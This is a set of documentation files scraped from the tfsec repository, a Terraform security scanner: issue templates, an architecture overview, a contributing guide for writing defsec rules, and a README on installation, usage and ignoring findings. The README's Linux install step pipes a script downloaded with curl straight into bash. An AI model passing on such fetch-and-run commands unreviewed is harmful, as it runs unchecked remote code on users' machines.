{"source": "github", "repo": "aquasecurity/tfsec", "file": ".github/ISSUE_TEMPLATE/bug_report.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/.github/ISSUE_TEMPLATE/bug_report.md", "content": "---\nname: Bug report\nabout: Create a report to help us improve\ntitle: 'bug: '\nlabels: [\"bug\",\"needs-triage\"]\nassignees: ''\n\n---\n\n**Describe the bug**\n<!-- A clear and concise description of what the bug is. -->\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Go to '...'\n2. Click on '....'\n3. Scroll down to '....'\n4. See error\n\n**Expected behavior**\n<!-- A clear and concise description of what you expected to happen. -->\n\n**Output of your tfsec command with --debug flag**\n<!-- If applicable, add screenshots/output to help explain your problem. Remove sensitive info first! -->\n\n**System Info**\n<!-- complete the following -->\n - tfsec version: `?`\n - terraform version: `?`\n - OS: `?`\n\n**Example Code**\n<!-- a minimal terraform example which will help us reproduce the issue (remove anything sensitive first!) -->\n\n**Additional context**\n<!-- Add any other context about the problem here. -->\n", "timestamp": "2025-10-24T11:40:04.083337"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": ".github/ISSUE_TEMPLATE/feature_request.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/.github/ISSUE_TEMPLATE/feature_request.md", "content": "---\nname: Feature request\nabout: Suggest an idea for this project\ntitle: 'feat: '\nlabels: [\"feature\", \"needs-triage\"]\nassignees: ''\n\n---\n\n**Is your feature request related to a problem? Please describe.**\n<!-- A clear and concise description of what the problem is. Ex. I'm always frustrated when [...] -->\n\n**Describe the solution you'd like**\n<!-- A clear and concise description of what you want to happen. -->\n\n**Describe alternatives you've considered**\n<!-- A clear and concise description of any alternative solutions or features you've considered. -->\n\n**Additional context**\n<!-- Add any other context or screenshots about the feature request here. -->\n", "timestamp": "2025-10-24T11:40:04.238452"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": ".github/ISSUE_TEMPLATE/new-check-request.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/.github/ISSUE_TEMPLATE/new-check-request.md", "content": "---\nname: New check request\nabout: Request a new tfsec check\ntitle: \"feat: new check for \"\nlabels: 'new check', 'feature', 'requires-defsec'\nassignees: ''\n\n---\n\n**Target Provider**\n<!-- Please specify the provider that this check will target e.g. AWS, GCP etc. -->\n\n**Target Terraform Block type**\n- [ ] module\n- [ ] resource\n- [ ] data \n- [ ] provider\n- [ ] variable\n\n**Target Terraform Type(s)**\n<!-- Please specify the type(s)  eg; `aws_s3_bucket` or `azurerm_network_security_group` -->\n\n**Description of check**\n<!-- Please provide a description of what should be checked -->\n\n**Relevant links**\n<!-- Are there any links that support this check? -->\n\n**Anything Else**\n<!-- Anything else you think supports this check request -->\n\n", "timestamp": "2025-10-24T11:40:04.384566"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "ARCHITECTURE.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/ARCHITECTURE.md", "content": "# Architecture\n\nThis document aims to answer the question *Where is the code that does X?*\n\nFor more information please check out our [contributing guide](CONTRIBUTING.md) or get in touch with us via Slack/issues/discussions.\n\n## Important Packages\n\nAt a very high level, tfsec is structured like this. The most important packages are broken down below.\n\n```mermaid\nflowchart LR;\n    files[\"*.tf files\"]\n    parser[\"parser.Parse()\"]\n    adapter[\"adapter.Adapt()\"]\n    scanner[\"scanner.Scan()\"]\n    results[\"Results\"]\n    files-->parser;\n    parser-->adapter;\n    adapter-->scanner;\n    scanner-->results;\n```\n\n### Entrypoint: `cmd/tfsec`\n\nThe entry point for the main *tfsec* CLI.\n\n### CLI: `internal/app/tfsec/cmd`\n\nCode to support running in the CLI, including flags, output settings etc.\n\n### Parser\n\nCan be found in [defsec/parsers](https://github.com/aquasecurity/defsec/parsers).\n\nTakes plaintext Terraform HCL templates as input and produces logical abstractions from the `internal/pkg/block` package. Returns a slice of *modules* which in turn contain blocks which can contain other blocks, which can in turn ultimately contain attributes, as is the HCL format. Each of the abstractions for these concepts has many utility methods.\n\n### Adapters\n\nCan be found in [defsec](https://github.com/aquasecurity/defsec/adapters/terraform).\n\nTakes the abstracted Terraform building blocks mentioned above e.g. *blocks*, *resources*, *attributes* etc. as input and *adapts* them into a common data format which represents cloud resource e.g. a struct which represents an AWS S3 bucket.\n\n### Scanner: `pkg/scanner`\n\nTakes the *adapted* cloud resources as input and runs all defsec rules against them. Returns a list of results as output.\n\n### Testing: `test`\n\nEnd-to-end tests that pull example Terraform code from defsec, run it through `tfsec` and apply all defsec rules, ensuring the expected result for each code example.\n\n", "timestamp": "2025-10-24T11:40:07.477569"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "CODE_OF_CONDUCT.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/CODE_OF_CONDUCT.md", "content": "# Code of Conduct\n\nAqua Security open source projects follow the [CNCF Code of Conduct](https://github.com/cncf/foundation/blob/master/code-of-conduct.md).\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be reported to a project maintainer.\n\n", "timestamp": "2025-10-24T11:40:07.928983"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "CONTRIBUTING.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/CONTRIBUTING.md", "content": "# Contributing\n\nThank you for considering a contribution to tfsec! :heart:\n\n<p align=\"center\">\n    <img alt=\"welcome to the party, pal!\" src=\"https://media.giphy.com/media/l0MYGb1LuZ3n7dRnO/giphy.gif\"/>\n</p>\n\nPlease review the following resources:\n\n- [ARCHITECTURE.md](ARCHITECTURE.md): A very high level document that gives an overview of the code and aims to answer the question *Where is the code that does X?*\n- [#tfsec on AquaSec Slack](https://slack.aquasec.com): Come and talk over any questions/suggestions you have with us on Slack!\n- [tfsec documentation](https://aquasecurity.github.io/tfsec/latest/): General usage documentation and rule information.\n\n## :ballot_box_with_check: PR Checklist\n\n- Ensure the build passes locally first with `make pr-ready`.\n- Add a brief description of your change.\n- Link to the issue which the PR resolves. Please [create one](https://github.com/aquasecurity/tfsec/issues/new/choose) if necessary.\n- Prefix your PR title with one of feat, fix, docs, style, refactor, perf, test, build, ci, chore, revert ([see here](https://github.com/commitizen/conventional-commit-types/blob/v3.0.0/index.json)) as described in [Conventional Commits](https://www.conventionalcommits.org/) e.g. `feat: Add new rule for AWS S3 bucket encryption`.\n- For bonus points, include a gif to maintain reviewer morale.\n    \n\n## :book: Guide: Adding New Rules \n\nIf you have any questions/suggestions about the steps below, please get in touch! If you get stuck at any point we'd be happy to chat, assist or pair-program with you to get your rule merged. The process may look daunting, however, many steps can often be skipped or are simpler than the volume of text makes them look at first glance. \nDon't be afraid to get stuck in and ask us for help if required! For quick assistance [Slack](https://slack.aquasec.com) is often the quickest route to help.\n\n### :fork_and_knife: Step 1: Fork *defsec*\n\nAs described in [ARCHITECTURE.md](ARCHITECTURE.md), the rule logic is defined in the [DefSec](https://github.com/aquasecurity/defsec) repository. To add a new rule, we'll need to add it here before pulling it into tfsec. \n\nSo firstly you'll need to [fork the repository](https://github.com/aquasecurity/defsec/fork) and clone it on your local machine:\n\n```bash\n# clone your fork of defsec\ngit clone git@github.com/YOUR_USERNAME/defsec.git\n# create a working branch for your new rule\ncd defsec \ngit checkout -b my-awesome-new-rule\n```\n\n### :cloud: Step 2: Add Cloud Provider/Service Support\n\n DefSec already covers most popular cloud providers; with many services, resources and attributes available for each.\n\nThe `provider` package contains structs that represent cloud resources, such as [AWS S3 Buckets](https://github.com/aquasecurity/defsec/blob/master/provider/aws/s3/bucket.go#L5). Rules simply check the various properties of these structs without having to worry about the intricacies of Terraform, CloudFormation or whatever was used to define the resources.\n\nBrowse the `provider/` directory to see if your desired provider/service are available. Inside the package for your service, check the defined structs and check that the particular resource (e.g. EC2 Instance) is defined along with the particular attributes you need to check.\n\nIf all of the above are already in place, you can skip to *Step 3*. Otherwise, keep reading...\n\n<p align=\"center\">\n    <img alt=\"Leaky cloud\" src=\"https://media.giphy.com/media/mNG0rIdAYvLog0Wr8H/giphy.gif\" />\n</p>\n\nAdd structs for your resource(s)/attribute(s)/service/provider as required. These should be accessible via the root [state.State](https://github.com/aquasecurity/defsec/blob/master/state/state.go). If you're adding a brand new provider, you'll need to add a property here. Otherwise just make sure you can access it via the relevant property.\n\nYou'll notice that most properties on these structs use things like `types.String` instead of a regular Go `string`. This is because these special types have to store more than the relevant string value - they also contain metadata about where this value was defined - e.g. *The `Name` of this S3 Bucket was defined in main.tf on line 6*. \n\nWe generally refer to these as *wrapped* types, because the actual value is *wrapped* in a struct along with the extra metadata. You don't have to worry about where this metadata comes from right now, `tfsec` will do most of the heavy lifting where this is concerned. You can check out the `types` package or other files in the `provider` package to see what types are available.\n\nYou may also spot the inclusion of a `types.Metadata` property in many `provider` structs. This metadata exists to store where the entire resource is defined e.g. *The Terraform block that defines this bucket is on lines 5 to 32 of main.tf*. Again, don't worry about how this will be populated, we'll cover that later.\n\nAnother useful thing that metadata provides (on top of the definition file and line range) is whether or not a resource is *managed*. A managed resource in `tfsec` is one which has a `resource` HCL block somewhere in the Terraform code being scanned. Why would we ever have a resource which doesn't exist in the code? Well, sometimes we need to *imply* the existence of resources. For example, if a Terraform template exists which contains the following:\n\n```hcl\nresource \"aws_s3_bucket_object\" \"my-file\" {\n   bucket = \"megabucket\"\n   key    = \"backup.zip\"\n   source = \"files/backup.zip\"\n}\n```\n\nAn [S3 bucket object](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_object) must live inside a [bucket](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket). It cannot exist without one. But often infrastructure is defined in multiple repositories. The definition for the `megabucket` bucket may exist in another repository. When `tfsec` scans the code above in isolation, it has to *imply* the existence of `megabucket` in order to build the provider hierarchy (`bucket CONTAINS object`). But we don't want to apply all of the security rules to this implied bucket, because it doesn't exist in the source template and we can't be sure of any of it's attributes. `tfsec` flags these implied resources as *unmanaged*, and rule logic will generally avoid checking attributes of these resources for this reason.\n\n### :lock: Step 3: Add Rule Logic\n\nRules are stored in the `rules/*` packages in defsec. They are organised in the same way as the `provider/*` packages: grouped together by provider and then service. Different resources are generally broken out into separate files, but this is left to the judgement of the developer.\n\nEach rule should include the following files:\n\n- rule_name.go: The core rule logic and metadata.\n- rule_name_test.go: Tests for the rule.\n\nFor a rule to be useful, it should include **at least 1** of the following:\n\n- rule_name.tf.go: Good and bad Terraform examples (mainly for documentation purposes)\n- rule_name.cf.go: Good and bad CloudFormation examples (mainly for documentation purposes)\n\nIf you have examples for other IaC technologies we'd love to add them too! Please let us know on Slack or GitHub.\n\n\n<p align=\"center\">\n    <img alt=\"You have to live by my rules\" src=\"https://media.giphy.com/media/ZXffEBBmsI3md367PN/giphy.gif\" />\n</p>\n\nCreate your core rule file by duplicating an existing rule and renaming it appropriately. Remove all logic from the function at the end for now.\n\nRules should add results for failure or non-compliance with the check logic AND also provide a Passed result for when the check complies.\n\nFill out the `rules.Rule` struct with appropriate information. The fields are described below:\n\n| Field            | Description |\n| ---------------- | ----------- |\n| AVDID            | This is a unique ID that identifies the rule not just within DefSec, but within the [AVD](https://avd.aquasec.com/). The ID is composed of the prefix `AVD-`, three letters representing the provider in capitals e.g. `AWS`, another `-`, and then a 4-digit, zero-padded number. For example: `AVD-AWS-0086`. The easiest way to assign a new AVD ID is to run `grep -r \"AVD-\" . | grep AVDID | awk -F'\"' '{print $2}' | sort -u` to find the highest number for your provider and increment it by one.\n| Provider         | You can set this using a constant from the `provider` package, listed [here](https://github.com/aquasecurity/defsec/blob/master/provider/providers.go#L8-L21)\n| Service          | A string representing the service your rule relates to (lower-case), e.g. `s3`. This will generally match the package your rule is inside.\n| ShortCode        | This is a human-readable identifier for your check that uniquely describes it within the provider and service. e.g. `block-public-acls`\n| Summary          | A short paragraph that summarises what best-practice the rule is trying to enforce. e.g. *Data stored in service X should be encrypted at rest*\n| Impact           | A short sentence describing the security impact of the rule failing e.g. *All data stored using service Y will be publicly available*.\n| Resolution       | A short sentence describing how to resolve the issue. This shouldn't be tied to implementation technology such as Terraform/CloudFormation, but written at a higher level in terms of Cloud Resources and configuration e.g. *Enable encryption for this bucket*\n| Explanation      | A detailed explanation of why this is an issue. Often very short for simple rules.\n| Links            | A list of external references/guides that relate to the rule.\n| Severity         | The severity of the check.\n| Terraform/CloudFormation | These contain good and bad code examples (those that pass and fail the rule respectively); a list of IaC technology specific links e.g. a link to the specific resource documentation on the [Terraform Registry](https://registry.terraform.io/); and a markdown block that describes remediation using the specific IaC technology e.g. *Set the Terraform parameter `enable_encryption` to `true`*\n\nWe use the following guide to approximate severity:\n\n| Level    | When to use                                                                        | Example                                               |\n| -------- | ---------------------------------------------------------------------------------- | ----------------------------------------------------- |\n| Critical | Direct risk of compromise to infrastructure, data or other assets.                 | A database resource is marked as publicly accessible. |\n| High     | A misconfiguration that indirectly compromises the security of the infrastructure.            | A storage medium is unencrypted.                      |\n| Medium   | Best practice has not been followed that impacts the security posture of the organisation. | \"Force destroy\" is enabled on a bucket.               |\n| Low      | Best practice has not been followed, which decreases operational efficiency.       | Description missing on security group rule.           |\n\nNext up, it's time to write some tests. You can copy the [Google BigQuery tests](https://github.com/aquasecurity/defsec/blob/master/rules/google/bigquery/no_public_access_test.go) as a starting point. \n\nThe tests should take a provider *service* struct as an input, apply the rule, and check that the rule had a positive/negative result as required.\n\nRunning the tests should fail, as there is currently no logic in the rule. Now it's finally time to write your rule logic! This lives in the function at the end of your core rule file. \n\nThe `*state.State` which is passed to the rule contains all cloud resources which have been detected in Terraform templates by `tfsec` (or in another set of sources by another tool!). Most rules will look in this struct for certain cloud resources and check certain properties, they're relatively simple and you can find inspiration in any of the existing rules. If you find a positive result, you can use `results.Add(...)` to record it. This method takes a description of the issue e.g. *Bucket is not encrypted* and the *source* of the issue. The source is either the struct that represents the cloud resource with the issue, or preferably a specific attribute of the struct, where possible. This is recorded so the source of the issue can be shown to the end user when tfsec runs.\n\n### :left_right_arrow: Step 4: Write an Adapter\n\n*defsec* (and therefore *tfsec*) supports a lot of cloud providers and services, but there are always more to add (especially with the frequency that AWS adds new services!) and so it is often required to add or update *adapters*. *defsec* parses Terraform templates into handy Go structs that represent HCL concepts such as *blocks*, *attributes* etc. and also Terraform specific concepts such as *modules*, *resources* etc. \n\nAll of the structs that describe a Terraform project are passed to the *adapters* to summarise into *defsec* structs - those that you created in *Step 2* above.\n\n<p align=\"center\">\n    <img alt=\"the squirrel needs to adapt?\" src=\"https://media.giphy.com/media/a1zcR7A6v5k9Mcdxuz/giphy.gif\" />\n</p>\n\nYour adapter will receive a list of Terraform modules which you can traverse to find particular blocks, attributes etc., and manufacture a series of defsec structs to return. You can see how this works by reviewing some of the many existing implementations.\n\nWhilst the end-to-end tests will automatically cover your new rule and adapter, it's recommended to also add a more granular set of tests for your adaptation code. You can [check out some examples of this](https://github.com/aquasecurity/defsec/tree/master/adapters/terraform/aws/apigateway) to get some inspiration. Or some copy and paste fuel.\n\n### Step 5: Create your *defsec* Pull Request \n\nOnce your tests pass, it's time to [raise a pull request](https://github.com/aquasecurity/defsec/compare)!\n\nYou can see a good example of a PR for a new defsec rule [here](https://github.com/aquasecurity/defsec/pull/115/files).\n\nAt this point you're waiting on us to review and merge your pull request. We're aiming to get to all pull requests within days in the post version 1 world, but often much faster - you can often chat to us on Slack to accelerate the process.\n\nWhile waiting you can [fork the tfsec repository](https://github.com/aquasecurity/tfsec/fork) and clone it on your local machine to prepare for the next step:\n\n```bash\n# clone your fork of tfsec\ngit clone git@github.com/YOUR_USERNAME/tfsec.git\n# create a working branch for your new rule\ncd tfsec && git checkout -b my-awesome-new-rule\n```\n\nAfter merging a defsec PR we'll create a tag straight away - we generally release little and often - so you can use the new version in tfsec.\n\n### :arrow_down: Step 6: Apply the New Rule in *tfsec*\n\n> NOTE: If you'd like to earn bonus points and support running your rule against *CloudFormation*, you can repeat this step in the [cfsec](https://github.com/aquasecurity/cfsec) repository - if not we'll get to it eventually and make sure your rule runs everywhere!\n\nUpdate the version of defsec that is used by tfsec:\n\n```bash\n# in your tfsec repo directory\ngo get github.com/aquasecurity/defsec@latest\ngo mod vendor\n```\n\nAt this point *tfsec* will automatically pull in your new rule when it runs. It will also pull in the good/bad example code you provided earlier and automatically test this code to see if the rule matches expectations against each.\n\nIf you run `make test` and everything looks good, you can skip to *Step 6* - you're ready to raise a pull request against *tfsec* and put your feet up. \n\nAlternatively, if the tests fail, it's likely that *tfsec* needs to be taught how to recognise the cloud resource your test covers in Terraform code, and translate it to a defsec struct. We refer to this process as *adaptation*.\n\n\n### :checkered_flag: Step 7: Prepare a *tfsec* Pull Request\n\n<p align=\"center\">\n    <img alt=\"Pull!\" src=\"https://media.giphy.com/media/nJKDTpuxnZE7fb6Z1b/giphy.gif\" />\n</p>\n\nIn order to raise your *tfsec* pull request, please run:\n\n```bash\nmake publish-docs\n```\n\nThis will automatically create markdown documentation for your new rule and add it to the documentation navigation etc. You'll need to commit these documentation changes.\n\n```bash\nmake pr-ready\n```\n\nThis will run some linters, run the tests and replicate the checks we apply in CI so you can ensure the build passes locally before pushing your code.\n\nNow you're ready to [raise the pull request](https://github.com/aquasecurity/tfsec/compare). We'll try to review it as soon as possible, but if it's taking longer than you'd like, feel free to chat to us on Slack.\n\n### :partying_face: Step 7: Relax\n\nYou've earned it. You have helped countless individuals and organisations to secure their infrastructure and make the internet a safer place!\n\n<p align=\"center\">\n    <img alt=\"relaxing cat\" src=\"https://i.giphy.com/media/d7nd6bdypnYjGT1jP3/giphy.webp\"/>\n</p>\n", "timestamp": "2025-10-24T11:40:08.371505"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "README.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/README.md", "content": "<p align=\"center\">\n  <img width=\"354\" src=\".github/images/tfsec_worded.png\">\n</p>\n\n[![GoReportCard](https://goreportcard.com/badge/github.com/aquasecurity/tfsec)](https://goreportcard.com/report/github.com/aquasecurity/tfsec)\n[![Join Our Slack](https://img.shields.io/badge/Slack-Join-green)](https://slack.aquasec.com/)\n[![Docker Build](https://img.shields.io/docker/v/tfsec/tfsec?label=docker)](https://hub.docker.com/r/tfsec/tfsec)\n[![Homebrew](https://img.shields.io/badge/dynamic/json.svg?url=https://formulae.brew.sh/api/formula/tfsec.json&query=$.versions.stable&label=homebrew)](https://formulae.brew.sh/formula/tfsec)\n[![Chocolatey](https://img.shields.io/chocolatey/v/tfsec)](https://chocolatey.org/packages/tfsec)\n[![AUR version](https://img.shields.io/aur/version/tfsec-bin)](https://aur.archlinux.org/packages/tfsec-bin)\n[![VScode Extension](https://img.shields.io/visual-studio-marketplace/v/tfsec.tfsec?label=vscode)](https://marketplace.visualstudio.com/items?itemName=tfsec.tfsec)\n\n## 📣 tfsec to Trivy Migration\n\nAs part of our goal to provide a comprehensive open source security solution for all, we have been consolidating all of our scanning-related efforts in one place, and that is [Trivy](https://github.com/aquasecurity/trivy). \n\nOver the past year, tfsec has laid the foundations to Trivy's IaC & misconfigurations scanning capabilities, including Terraform scanning, which has been natively supported in Trivy for a long time now.\n\nGoing forward we want to encourage the tfsec community to transition over to Trivy. Moving to Trivy gives you the same excellent Terraform scanning engine, with some extra benefits:\n\n1. Access to more languages and features in the same tool.\n2. Access to more integrations with tools and services through the rich ecosystem around Trivy.\n3. Commercially supported by Aqua as well as by a the passionate Trivy community.\ntfsec will continue to remain available for the time being, although our engineering attention will be directed at Trivy going forward.\n\n## tfsec to Trivy migration guide\n\nFor further information on how Trivy compares to tfsec and moving from tfsec to Trivy, do have a look at the [migration guide.](https://github.com/aquasecurity/tfsec/blob/master/tfsec-to-trivy-migration-guide.md)\n\n## Overview\ntfsec uses static analysis of your terraform code to spot potential misconfigurations.\n\n### Features\n\n- :cloud: Checks for misconfigurations across all major (and some minor) cloud providers\n- :no_entry: Hundreds of built-in rules\n- :nesting_dolls: Scans modules (local and remote)\n- :heavy_plus_sign: Evaluates HCL expressions as well as literal values\n- :arrow_right_hook: Evaluates Terraform functions e.g. `concat()`\n- :link: Evaluates relationships between Terraform resources\n- :toolbox: Compatible with the Terraform CDK\n- :no_good: Applies (and embellishes) user-defined Rego policies\n- :page_with_curl: Supports multiple output formats: lovely (default), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.\n- :hammer_and_wrench: Configurable (via CLI flags and/or config file)\n- :zap: Very fast, capable of quickly scanning huge repositories\n- :electric_plug: Plugins for popular IDEs available ([JetBrains](https://plugins.jetbrains.com/plugin/18687-tfsec-findings-explorer), [VSCode](https://marketplace.visualstudio.com/items?itemName=tfsec.tfsec) and [Vim](https://github.com/aquasecurity/vim-tfsec))\n- :house_with_garden: Community-driven - come and chat with us [on Slack](https://slack.aquasec.com/)!\n\n## Recommended by Thoughtworks\n\nRated _Adopt_ by the [Thoughtworks Tech Radar](https://www.thoughtworks.com/en-gb/radar/tools/tfsec):\n\n> For our projects using Terraform, tfsec has quickly become a default static analysis tool to detect potential security risks. It's easy to integrate into a CI pipeline and has a growing library of checks against all of the major cloud providers and platforms like Kubernetes. Given its ease of use, we believe tfsec could be a good addition to any Terraform project.\n\n## Example Output\n\n![Example screenshot](screenshot.png)\n\n## Installation\n\nInstall with [brew/linuxbrew](https://brew.sh)\n\n```bash\nbrew install tfsec\n```\n\nInstall with [Chocolatey](https://chocolatey.org/)\n\n```cmd\nchoco install tfsec\n```\n\nInstall with [Scoop](https://scoop.sh/)\n\n```cmd\nscoop install tfsec\n```\nBash script (Linux):\n\n```console\ncurl -s https://raw.githubusercontent.com/aquasecurity/tfsec/master/scripts/install_linux.sh | bash\n```\n\nYou can also grab the binary for your system from the [releases page](https://github.com/aquasecurity/tfsec/releases).\n\nAlternatively, install with Go:\n\n```bash\ngo install github.com/aquasecurity/tfsec/cmd/tfsec@latest\n```\n\nPlease note that using `go install` will install directly from the `master` branch and version numbers will not be reported via `tfsec --version`.\n\n### Signing\n\nThe binaries on the [releases page](https://github.com/aquasecurity/tfsec/releases) are signed with the tfsec signing key `D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE`\n\nForm more information check the [signing page](SIGNING.md) for instructions on verification.\n\n## Usage\n\ntfsec will scan the specified directory. If no directory is specified, the current working directory will be used.\n\nThe exit status will be non-zero if tfsec finds problems, otherwise the exit status will be zero.\n\n```bash\ntfsec .\n```\n\n## Use with Docker\n\nAs an alternative to installing and running tfsec on your system, you may run tfsec in a Docker container.\n\nThere are a number of Docker options available\n\n| Image Name | Base | Comment |\n|------------|------|---------|\n|[aquasec/tfsec](https://hub.docker.com/r/aquasec/tfsec)|alpine|Normal tfsec image|\n|[aquasec/tfsec-alpine](https://hub.docker.com/r/aquasec/tfsec-alpine)|alpine|Exactly the same as aquasec/tfsec, but for those whole like to be explicit|\n|[aquasec/tfsec-ci](https://hub.docker.com/r/aquasec/tfsec-ci)|alpine|tfsec with no entrypoint - useful for CI builds where you want to override the command|\n|[aquasec/tfsec-scratch](https://hub.docker.com/r/aquasec/tfsec-scratch)|scratch|An image built on scratch - nothing frilly, just runs tfsec|\n\nTo run:\n\n```bash\ndocker run --rm -it -v \"$(pwd):/src\" aquasec/tfsec /src\n```\n\n## Use with Visual Studio Code\n\nA Visual Studio Code extension is being developed to integrate with tfsec results. More information can be found on the [tfsec Marketplace page](https://marketplace.visualstudio.com/items?itemName=tfsec.tfsec)\n\n## Use as GitHub Action\n\nIf you want to run tfsec on your repository as a GitHub Action, you can use [https://github.com/aquasecurity/tfsec-pr-commenter-action](https://github.com/aquasecurity/tfsec-pr-commenter-action).\n\n## Use as an Azure DevOps Pipelines Task\n\nYou can now install the [official tfsec task](https://marketplace.visualstudio.com/items?itemName=AquaSecurityOfficial.tfsec-official). Please raise any issues/feature requests on the [task repository](https://github.com/aquasecurity/tfsec-azure-pipelines-task).\n\n## Ignoring Warnings\n\nYou may wish to ignore some warnings. If you'd like to do so, you can\nsimply add a comment containing `tfsec:ignore:<rule>` to the offending\nline in your templates. Alternatively, you can add the comment to the line above the block containing the issue, or to the module block to ignore all occurrences of an issue inside the module.\n\nFor example, to ignore an open security group rule:\n\n```terraform\nresource \"aws_security_group_rule\" \"my-rule\" {\n    type = \"ingress\"\n    cidr_blocks = [\"0.0.0.0/0\"] #tfsec:ignore:aws-vpc-no-public-ingress-sgr\n}\n```\n\n...or...\n\n```terraform\nresource \"aws_security_group_rule\" \"my-rule\" {\n    type = \"ingress\"\n    #tfsec:ignore:aws-vpc-no-public-ingress-sgr\n    cidr_blocks = [\"0.0.0.0/0\"]\n}\n```\n\nIf you're not sure which line to add the comment on, just check the\ntfsec output for the line number of the discovered problem.\n\nYou can ignore multiple rules by concatenating the rules on a single line:\n\n```terraform\n#tfsec:ignore:aws-s3-enable-bucket-encryption tfsec:ignore:aws-s3-enable-bucket-logging\nresource \"aws_s3_bucket\" \"my-bucket\" {\n  bucket = \"foobar\"\n  acl    = \"private\"\n}\n```\n\n### Expiration Date\nYou can set expiration date for `ignore` with `yyyy-mm-dd` format. This is a useful feature when you want to ensure ignored issue won't be forgotten and should be revisited in the future.\n```\n#tfsec:ignore:aws-s3-enable-bucket-encryption:exp:2025-01-02\n```\nIgnore like this will be active only till `2025-01-02`, after this date it will be deactivated.\n\n## Disable checks\n\nYou may wish to exclude some checks from running. If you'd like to do so, you can\nsimply add new argument `-e check1,check2,etc` to your cmd command\n\n```bash\ntfsec . -e general-secrets-sensitive-in-variable,google-compute-disk-encryption-customer-keys\n```\n\n## Including values from .tfvars\n\nYou can include values from a tfvars file in the scan,  using, for example: `--tfvars-file terraform.tfvars`.\n\n## Included Checks\n\ntfsec supports many popular cloud and platform providers\n\n| Checks                                                                                  |\n|:----------------------------------------------------------------------------------------|\n| [AWS Checks](https://aquasecurity.github.io/tfsec/latest/checks/aws/)                   |\n| [Azure Checks](https://aquasecurity.github.io/tfsec/latest/checks/azure/)               |\n| [GCP Checks](https://aquasecurity.github.io/tfsec/latest/checks/google/)                |\n| [CloudStack Checks](https://aquasecurity.github.io/tfsec/latest/checks/cloudstack/)     |\n| [DigitalOcean Checks](https://aquasecurity.github.io/tfsec/latest/checks/digitalocean/) |\n| [GitHub Checks](https://aquasecurity.github.io/tfsec/latest/checks/github/)             |\n| [Kubernetes Checks](https://aquasecurity.github.io/tfsec/latest/checks/kubernetes/)     |\n| [OpenStack Checks](https://aquasecurity.github.io/tfsec/latest/checks/openstack/)       |\n| [Oracle Checks](https://aquasecurity.github.io/tfsec/latest/checks/oracle/)             |\n\n## Running in CI\n\ntfsec is designed for running in a CI pipeline. You may wish to run tfsec as part of your build without coloured\noutput. You can do this using `--no-colour` (or `--no-color` for our American friends).\n\n## Output options\n\nYou can output tfsec results as JSON, CSV, Checkstyle, Sarif, JUnit or just plain old human-readable format. Use the `--format` flag\nto specify your desired format.\n\n## GitHub Security Alerts\nIf you want to integrate with Github Security alerts and include the output of your tfsec checks you can use the [tfsec-sarif-action](https://github.com/marketplace/actions/run-tfsec-with-sarif-upload) Github action to run the static analysis then upload the results to the security alerts tab.\n\nThe alerts generated for [tfsec-example-project](https://github.com/tfsec/tfsec-example-project) look like this.\n\n![github security alerts](codescanning.png)\n\nWhen you click through the alerts for the branch, you get more information about the actual issue.\n\n![github security alerts](scanningalert.png)\n\nFor more information about adding security alerts, check [the GitHub documentation](https://docs.github.com/en/code-security/repository-security-advisories/about-github-security-advisories-for-repositories)\n\n## Support for older terraform versions\n\nIf you need to support versions of terraform which use HCL v1\n(terraform <0.12), you can use `v0.1.3` of tfsec, though support is\nvery limited and has fewer checks.\n\n## Contributing\n\nWe always welcome contributions; big or small, it can be documentation updates, adding new checks or something bigger. Please check the [Contributing Guide](CONTRIBUTING.md) for details on how to help out.\n\n### Some People who have contributed\n\n<a href = \"https://github.com/aquasecurity/tfsec/graphs/contributors\">\n  <img src = \"https://contrib.rocks/image?repo=aquasecurity/tfsec\"/>\n</a>\n\nMade with [contributors-img](https://contrib.rocks).\n\n`tfsec` is an [Aqua Security](https://aquasec.com) open source project.\nLearn about our open source work and portfolio [here](https://www.aquasec.com/products/open-source-projects/).\nJoin the community, and talk to us about any matter in [GitHub Discussion](https://github.com/aquasecurity/tfsec/discussions) or [Slack](https://slack.aquasec.com).\n", "timestamp": "2025-10-24T11:40:10.367671"}
